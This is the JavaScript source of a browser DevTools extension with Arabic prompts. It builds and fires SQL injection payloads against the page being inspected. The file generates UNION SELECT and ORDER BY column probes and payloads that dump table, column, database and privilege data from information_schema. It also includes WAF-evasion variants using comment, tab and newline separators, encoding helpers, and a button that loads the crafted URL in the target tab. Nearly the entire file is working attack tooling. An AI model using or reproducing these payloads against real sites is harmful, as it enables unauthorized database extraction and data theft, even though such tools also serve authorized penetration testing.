
const box = document.getElementById("payload");

let start = 0;
let end = 0;
let hasSelection = false;

function saveSelection() {
  start = box.selectionStart;
  end = box.selectionEnd;
  hasSelection = start !== end;
}

function selectedText() {
  return box.value.substring(start, end);
}

box.addEventListener("mouseup", saveSelection);
box.addEventListener("keyup", saveSelection);
box.addEventListener("input", saveSelection);
box.addEventListener("select", saveSelection);
box.addEventListener("click", saveSelection);

document.querySelectorAll(".menu, .item").forEach(el => {
  el.addEventListener("mousedown", saveSelection);
});

document.querySelectorAll(".menu").forEach(menu => {
  menu.addEventListener("mouseleave", () => menu.classList.remove("menu-closed"));

  const button = menu.querySelector(".menu-btn");
  if (button) {
    button.addEventListener("mouseenter", () => menu.classList.remove("menu-closed"));
  }
});

function closeMenus() {
  document.querySelectorAll(".menu").forEach(menu => menu.classList.add("menu-closed"));
}

function insertPayload(full, replacement) {
  const value = hasSelection ? (replacement || full) : full;

  if (hasSelection) {
    box.value = box.value.substring(0, start) + value + box.value.substring(end);
    const pos = start + value.length;
    box.focus();
    box.setSelectionRange(pos, pos);
  } else {
    const pos = box.selectionStart || box.value.length;
    box.value = box.value.slice(0, pos) + value + box.value.slice(pos);
    box.focus();
    box.setSelectionRange(pos + value.length, pos + value.length);
  }

  saveSelection();
}

document.querySelectorAll(".payload").forEach(item => {
  item.addEventListener("click", () => {
    insertPayload(item.dataset.full || "", item.dataset.replace || "");
    closeMenus();
  });
});

function buildNumberList(count) {
  const columns = [];
  for (let i = 1; i <= count; i++) {
    columns.push(i);
  }
  return columns.join(",");
}

function buildOrderByPayload(count) {
  return "order+by+" + buildNumberList(count);
}

function buildUnionSelectPayload(count) {
  return "union+select+" + buildNumberList(count);
}

function buildNullList(count) {
  const columns = [];
  for (let i = 1; i <= count; i++) {
    columns.push("NULL");
  }
  return columns.join(",");
}

function buildUnionSelectNullPayload(count) {
  return "union+select+" + buildNullList(count);
}

function buildColumnsWithInjectedValue(totalColumns, vulnerableColumn, injectedValue) {
  const columns = [];
  for (let i = 1; i <= totalColumns; i++) {
    columns.push(i === vulnerableColumn ? injectedValue : String(i));
  }
  return columns.join(",");
}

function buildTablePayload(totalColumns, vulnerableColumn, injectedValue, options = {}) {
  const prefix = options.prefix || "+union+select+";
  const suffix = options.suffix || "+FROM+information_schema.tables--+-";
  return prefix + buildColumnsWithInjectedValue(totalColumns, vulnerableColumn, injectedValue) + suffix;
}

function askForTablePayloadColumn(title, injectedValue, options = {}) {
  const totalAnswer = prompt(title + "\nكم عدد الأعمدة الكلي؟ مثال: 6");
  if (totalAnswer === null) return;

  const totalColumns = Number(totalAnswer.trim());
  if (!Number.isInteger(totalColumns) || totalColumns <= 0) {
    alert("اكتب عدد أعمدة صحيح أكبر من 0");
    return;
  }

  const columnAnswer = prompt(title + "\nما رقم العمود المصاب؟ مثال: 5");
  if (columnAnswer === null) return;

  const vulnerableColumn = Number(columnAnswer.trim());
  if (!Number.isInteger(vulnerableColumn) || vulnerableColumn <= 0 || vulnerableColumn > totalColumns) {
    alert("رقم العمود المصاب لازم يكون بين 1 و " + totalColumns);
    return;
  }

  const payload = buildTablePayload(totalColumns, vulnerableColumn, injectedValue, options);
  insertPayload(payload, payload);
  closeMenus();
}

function buildColumnPayload(totalColumns, vulnerableColumn, injectedValue, tableName) {
  const safeTableName = tableName.replace(/'/g, "''");
  return "+union+select+" + buildColumnsWithInjectedValue(totalColumns, vulnerableColumn, injectedValue) + "+FROM+information_schema.columns+WHERE+table_name='" + safeTableName + "'--";
}

function askForColumnPayloadColumn(title, injectedValue) {
  const tableAnswer = prompt(title + "\nاكتب اسم الجدول table name؟ مثال: users");
  if (tableAnswer === null) return;

  const tableName = tableAnswer.trim();
  if (!tableName) {
    alert("اكتب اسم الجدول");
    return;
  }

  const totalAnswer = prompt(title + "\nكم عدد الأعمدة الكلي؟ مثال: 6");
  if (totalAnswer === null) return;

  const totalColumns = Number(totalAnswer.trim());
  if (!Number.isInteger(totalColumns) || totalColumns <= 0) {
    alert("اكتب عدد أعمدة صحيح أكبر من 0");
    return;
  }

  const columnAnswer = prompt(title + "\nما رقم العمود المصاب؟ مثال: 4");
  if (columnAnswer === null) return;

  const vulnerableColumn = Number(columnAnswer.trim());
  if (!Number.isInteger(vulnerableColumn) || vulnerableColumn <= 0 || vulnerableColumn > totalColumns) {
    alert("رقم العمود المصاب لازم يكون بين 1 و " + totalColumns);
    return;
  }

  const payload = buildColumnPayload(totalColumns, vulnerableColumn, injectedValue, tableName);
  insertPayload(payload, payload);
  closeMenus();
}

function askForDataPayloadColumn() {
  const tableAnswer = prompt("data\nاكتب اسم الجدول table_name؟ مثال: users");
  if (tableAnswer === null) return;

  const tableName = tableAnswer.trim();
  if (!tableName) {
    alert("اكتب اسم الجدول");
    return;
  }

  const totalAnswer = prompt("data\nكم عدد الأعمدة الكلي؟ مثال: 6");
  if (totalAnswer === null) return;

  const totalColumns = Number(totalAnswer.trim());
  if (!Number.isInteger(totalColumns) || totalColumns <= 0) {
    alert("اكتب عدد أعمدة صحيح أكبر من 0");
    return;
  }

  const columnAnswer = prompt("data\nما رقم العمود المصاب؟ مثال: 4");
  if (columnAnswer === null) return;

  const vulnerableColumn = Number(columnAnswer.trim());
  if (!Number.isInteger(vulnerableColumn) || vulnerableColumn <= 0 || vulnerableColumn > totalColumns) {
    alert("رقم العمود المصاب لازم يكون بين 1 و " + totalColumns);
    return;
  }

  const dataAnswer = prompt("data\nاكتب اسم data_name؟ مثال: username");
  if (dataAnswer === null) return;

  const dataName = dataAnswer.trim();
  if (!dataName) {
    alert("اكتب اسم data_name");
    return;
  }

  const payload = "+union+select+" + buildColumnsWithInjectedValue(totalColumns, vulnerableColumn, dataName) + "+FROM+" + tableName + "+--+-";
  insertPayload(payload, payload);
  closeMenus();
}

function askForAllDatabasePayloadColumn() {
  const totalAnswer = prompt("all database\nكم عدد الأعمدة الكلي؟ مثال: 6");
  if (totalAnswer === null) return;

  const totalColumns = Number(totalAnswer.trim());
  if (!Number.isInteger(totalColumns) || totalColumns <= 0) {
    alert("اكتب عدد أعمدة صحيح أكبر من 0");
    return;
  }

  const columnAnswer = prompt("all database\nما رقم العمود المصاب؟ مثال: 4");
  if (columnAnswer === null) return;

  const vulnerableColumn = Number(columnAnswer.trim());
  if (!Number.isInteger(vulnerableColumn) || vulnerableColumn <= 0 || vulnerableColumn > totalColumns) {
    alert("رقم العمود المصاب لازم يكون بين 1 و " + totalColumns);
    return;
  }

  const payload = "UNION+SELECT+" + buildColumnsWithInjectedValue(totalColumns, vulnerableColumn, "schema_name") + "+FROM+information_schema.schemata+--+-";
  insertPayload(payload, payload);
  closeMenus();
}


function askForPrivilegeTypePayloadColumn() {
  const totalAnswer = prompt("privilege type\nكم عدد الأعمدة الكلي؟ مثال: 6");
  if (totalAnswer === null) return;

  const totalColumns = Number(totalAnswer.trim());
  if (!Number.isInteger(totalColumns) || totalColumns <= 0) {
    alert("اكتب عدد أعمدة صحيح أكبر من 0");
    return;
  }

  const columnAnswer = prompt("privilege type\nما رقم العمود المصاب؟ مثال: 3");
  if (columnAnswer === null) return;

  const vulnerableColumn = Number(columnAnswer.trim());
  if (!Number.isInteger(vulnerableColumn) || vulnerableColumn <= 0 || vulnerableColumn > totalColumns) {
    alert("رقم العمود المصاب لازم يكون بين 1 و " + totalColumns);
    return;
  }

  const payload = "+UNION+SELECT+" + buildColumnsWithInjectedValue(totalColumns, vulnerableColumn, "GROUP_CONCAT(privilege_type)") + "+FROM+information_schema.user_privileges--+-";
  insertPayload(payload, payload);
  closeMenus();
}

function buildWafOrderByPayload(count, separator) {
  return "order" + separator + "by" + separator + buildNumberList(count);
}

function buildWafUnionSelectPayload(count, separator) {
  return "union" + separator + "select" + separator + buildNumberList(count);
}

function buildWafUnionSelectNullPayload(count, separator) {
  return "union" + separator + "select" + separator + buildNullList(count);
}

function askForCustomColumns(message, builder) {
  const answer = prompt(message);
  if (answer === null) return;

  const clean = answer.trim();
  const count = Number(clean);

  if (!Number.isInteger(count) || count <= 0) {
    alert("اكتب رقم صحيح أكبر من 0");
    return;
  }

  const payload = builder(count);
  insertPayload(payload, payload);
  closeMenus();
}

function askForOrderByColumns() {
  const answer = prompt("كم عدد الأعمدة؟ مثال: 7");
  if (answer === null) return;

  const clean = answer.trim();
  const count = Number(clean);

  if (!Number.isInteger(count) || count <= 0) {
    alert("اكتب رقم صحيح أكبر من 0");
    return;
  }

  const payload = buildOrderByPayload(count);
  insertPayload(payload, payload);
  closeMenus();
}

function askForUnionSelectColumns() {
  const answer = prompt("كم عدد أعمدة UNION SELECT؟ مثال: 7");
  if (answer === null) return;

  const clean = answer.trim();
  const count = Number(clean);

  if (!Number.isInteger(count) || count <= 0) {
    alert("اكتب رقم صحيح أكبر من 0");
    return;
  }

  const payload = buildUnionSelectPayload(count);
  insertPayload(payload, payload);
  closeMenus();
}

function askForUnionSelectNullColumns() {
  const answer = prompt("كم عدد أعمدة UNION SELECT NULL؟ مثال: 6");
  if (answer === null) return;

  const clean = answer.trim();
  const count = Number(clean);

  if (!Number.isInteger(count) || count <= 0) {
    alert("اكتب رقم صحيح أكبر من 0");
    return;
  }

  const payload = buildUnionSelectNullPayload(count);
  insertPayload(payload, payload);
  closeMenus();
}

document.querySelectorAll(".action").forEach(item => {
  item.addEventListener("click", () => {
    const action = item.dataset.action;

    if (action === "dynamic-order-by") askForOrderByColumns();
    if (action === "dynamic-union-select") askForUnionSelectColumns();
    if (action === "dynamic-union-select-null") askForUnionSelectNullColumns();
    if (action === "dynamic-table-name-column") {
      askForTablePayloadColumn("table_name", "table_name", {
        prefix: "+union+select+",
        suffix: "+FROM+information_schema.tables--+-"
      });
    }
    if (action === "dynamic-table-group-concat-column") {
      askForTablePayloadColumn("GROUP_CONCAT", "GROUP_CONCAT(table_name)", {
        prefix: "+union+select+",
        suffix: "+FROM+information_schema.tables--+-"
      });
    }
    if (action === "dynamic-table-database-column") {
      askForTablePayloadColumn("database", "GROUP_CONCAT(table_name+SEPARATOR+0x0a)", {
        prefix: "+UNION+SELECT+",
        suffix: "+FROM+information_schema.tables+WHERE+table_schema=database()+--+-"
      });
    }
    if (action === "dynamic-table-split-column") {
      askForTablePayloadColumn("split", "GROUP_CONCAT(table_name+SEPARATOR+0x0a)", {
        prefix: "+UNION+SELECT+",
        suffix: "+FROM+information_schema.tables+--+-"
      });
    }

    if (action === "dynamic-column-name-column") {
      askForColumnPayloadColumn("column_name", "column_name");
    }
    if (action === "dynamic-column-group-concat-column") {
      askForColumnPayloadColumn("GROUP_CONCAT", "GROUP_CONCAT(column_name)");
    }

    if (action === "dynamic-data-column") {
      askForDataPayloadColumn();
    }
    if (action === "dynamic-all-database-column") {
      askForAllDatabasePayloadColumn();
    }

    if (action === "dynamic-privilege-type-column") {
      askForPrivilegeTypePayloadColumn();
    }

    if (action === "dynamic-waf-order-by-comment") {
      askForCustomColumns("كم عدد أعمدة ORDER BY؟ مثال: 7", count => buildWafOrderByPayload(count, "/**/"));
    }
    if (action === "dynamic-waf-order-by-url") {
      askForCustomColumns("كم عدد أعمدة ORDER BY؟ مثال: 7", count => buildWafOrderByPayload(count, "+"));
    }
    if (action === "dynamic-waf-order-by-tab") {
      askForCustomColumns("كم عدد أعمدة ORDER BY؟ مثال: 7", count => buildWafOrderByPayload(count, "%09"));
    }
    if (action === "dynamic-waf-order-by-newline") {
      askForCustomColumns("كم عدد أعمدة ORDER BY؟ مثال: 7", count => buildWafOrderByPayload(count, "%0a"));
    }

    if (action === "dynamic-waf-union-select-comment") {
      askForCustomColumns("كم عدد أعمدة UNION SELECT؟ مثال: 7", count => buildWafUnionSelectPayload(count, "/**/"));
    }
    if (action === "dynamic-waf-union-select-url") {
      askForCustomColumns("كم عدد أعمدة UNION SELECT؟ مثال: 7", count => buildWafUnionSelectPayload(count, "+"));
    }
    if (action === "dynamic-waf-union-select-tab") {
      askForCustomColumns("كم عدد أعمدة UNION SELECT؟ مثال: 7", count => buildWafUnionSelectPayload(count, "%09"));
    }
    if (action === "dynamic-waf-union-select-newline") {
      askForCustomColumns("كم عدد أعمدة UNION SELECT؟ مثال: 7", count => buildWafUnionSelectPayload(count, "%0a"));
    }
    if (action === "dynamic-waf-union-select-null-comment") {
      askForCustomColumns("كم عدد أعمدة UNION SELECT NULL؟ مثال: 6", count => buildWafUnionSelectNullPayload(count, "/**/"));
    }
  });
});

function transformInput(fn) {
  try {
    if (hasSelection) {
      const text = selectedText();
      const out = fn(text);
      box.value = box.value.substring(0, start) + out + box.value.substring(end);
      box.focus();
      box.setSelectionRange(start, start + out.length);
    } else {
      box.value = fn(box.value);
      box.focus();
      box.setSelectionRange(box.value.length, box.value.length);
    }
    saveSelection();
  } catch {
    box.value = "Decode failed";
  }
}

function hexEncode(text) {
  return Array.from(text).map(c => c.charCodeAt(0).toString(16).padStart(2, "0")).join("");
}

function hexDecode(hex) {
  const clean = hex.replace(/^0x/, "").replace(/\s+/g, "");
  return clean.match(/.{1,2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join("");
}

document.querySelectorAll(".tool").forEach(item => {
  item.addEventListener("click", () => {
    const tool = item.dataset.tool;
    if (tool === "urlEncode") transformInput(encodeURIComponent);
    if (tool === "urlDecode") transformInput(decodeURIComponent);
    if (tool === "b64Encode") transformInput(t => btoa(unescape(encodeURIComponent(t))));
    if (tool === "b64Decode") transformInput(t => decodeURIComponent(escape(atob(t))));
    if (tool === "hexEncode") transformInput(hexEncode);
    if (tool === "hexDecode") transformInput(hexDecode);
    closeMenus();
  });
});

document.getElementById("loadUrl").onclick = () => {
  chrome.devtools.inspectedWindow.eval("window.location.href", (url, exceptionInfo) => {
    if (!exceptionInfo && url) {
      box.value = url;
      box.focus();
      box.setSelectionRange(box.value.length, box.value.length);
      saveSelection();
    }
  });
};

document.getElementById("execute").onclick = () => {
  const finalUrl = box.value.trim();
  if (!finalUrl.startsWith("http")) {
    box.value = "Invalid URL";
    return;
  }
  chrome.devtools.inspectedWindow.eval("window.location.href=" + JSON.stringify(finalUrl));
};

document.getElementById("clear").onclick = () => {
  box.value = "";
  box.focus();
  saveSelection();
};

document.getElementById("loadUrl").click();
